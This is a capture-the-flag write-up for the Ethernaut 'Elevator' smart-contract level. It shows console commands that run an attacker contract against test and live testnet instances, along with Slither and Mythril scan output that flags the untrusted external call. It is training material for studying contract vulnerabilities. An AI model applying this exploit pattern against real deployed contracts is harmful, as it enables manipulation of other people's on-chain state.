# Elevator

[Elevator](https://ethernaut.openzeppelin.com/level/0x4A151908Da311601D967a6fB9f8cFa5A3E88a251)


`Elevator` calls into a malicious contract, which customizes its response to exploit the caller.


<BR />

## Test Attack

```JS
el = await Elevator.deployed()
attack = await Attack.deployed()

await el.top()
await attack.goTo(11)
await el.top()
```

<BR />

## Live Attack

```JS
el = await Elevator.at("0xaef17A18bd4ec8abCE38EeE6B054242a69482D11")
attack = await Attack.deployed()

await el.top()
await attack.goTo(11)
await el.top()
```


<BR />


## Vulnerability Testing Tools


<BR />

### Slither

Not Detected.

```BASH
solc-select use 0.8.0
slither ./contracts/Elevator.sol  --truffle-ignore-compile  --exclude-optimization 
```

```
Pragma version^0.8.0 (contracts/Building.sol#2) allows old versions
Pragma version^0.8.0 (contracts/Elevator.sol#2) allows old versions
solc-0.8.0 is not recommended for deployment
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity

Parameter Elevator.goTo(uint256)._floor (contracts/Elevator.sol#10) is not in mixedCase
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#conformance-to-solidity-naming-conventions
./contracts/Elevator.sol analyzed (2 contracts with 76 detectors), 4 result(s) found
```

<BR />

### Mythril

__Bug detected__

```BASH
docker run --rm `
        -v /c/temp/QuickTest/blockchain-ctf/ethernaut/08_Elevator:/share `
        mythril/myth `
        analyze /share/contracts/Elevator.sol `
        --solv 0.8.0
```

```
==== External Call To User-Supplied Address ====
SWC ID: 107
Severity: Low
Contract: Elevator
Function name: goTo(uint256)
PC address: 255
Estimated Gas Usage: 2424 - 37176
A call to a user-supplied address is executed.
An external message call to an address specified by the caller is executed. Note that the callee account might contain arbitrary code and could re-enter any function within this contract. Reentering the contract in an intermediate state may lead to unexpected behaviour. Make sure that no state modifications are executed after this call and/or reentrancy guards are in place.
--------------------
In file: /share/contracts/Elevator.sol:13

building.isLastFloor(_floor)

--------------------
Initial State:

Account: [CREATOR], balance: 0x0, nonce:0, storage:{}
Account: [ATTACKER], balance: 0x0, nonce:0, storage:{}

Transaction Sequence:

Caller: [CREATOR], calldata: , decoded_data: , value: 0x0
Caller: [ATTACKER], function: goTo(uint256), txdata: 0xed9a71340101010101010201010101010101010101010101010101010101010201010101, decoded_data: (454086624460065118403028513926306553151386398674918459612631367141887639809,), value: 0x0

==== State access after external call ====
SWC ID: 107
Severity: Medium
Contract: Elevator
Function name: goTo(uint256)
PC address: 318
Estimated Gas Usage: 2424 - 37176
Write to persistent state following external call
The contract account state is accessed after an external call to a user defined address. To prevent reentrancy issues, consider accessing the state only before the call, especially if the callee is untrusted. Alternatively, a reentrancy lock can be used to prevent untrusted callees from re-entering the contract in an intermediate state.
--------------------
In file: /share/contracts/Elevator.sol:14

floor = _floor

--------------------
Initial State:

Account: [CREATOR], balance: 0x0, nonce:0, storage:{}
Account: [ATTACKER], balance: 0x0, nonce:0, storage:{}

Transaction Sequence:

Caller: [CREATOR], calldata: , decoded_data: , value: 0x0
Caller: [ATTACKER], function: goTo(uint256), txdata: 0xed9a71340101010101010201010101010101010101010101010101010101010201010101, decoded_data: (454086624460065118403028513926306553151386398674918459612631367141887639809,), value: 0x0
```

<BR />
